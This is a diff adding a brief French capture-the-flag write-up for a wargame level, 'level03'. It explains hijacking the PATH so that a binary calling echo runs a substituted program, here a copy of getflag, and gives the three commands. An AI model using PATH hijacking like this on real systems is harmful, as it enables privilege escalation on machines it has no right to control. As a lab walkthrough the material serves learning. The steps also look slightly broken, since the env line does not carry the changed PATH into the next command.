@@ -1,0 +1,6 @@
+Quand on fait un cat du fichier on voit “/usr/bin/env echo Exploit Me”
+l’executable semble utiliser la commande echo pour afficher son message.
+On peut creer une fasse commande echo qui fera autre chose (exemple la commande getflag…)
+cat /bin/getflag > /tmp/echo
+env PATH=/tmp:$PATH
+./level03
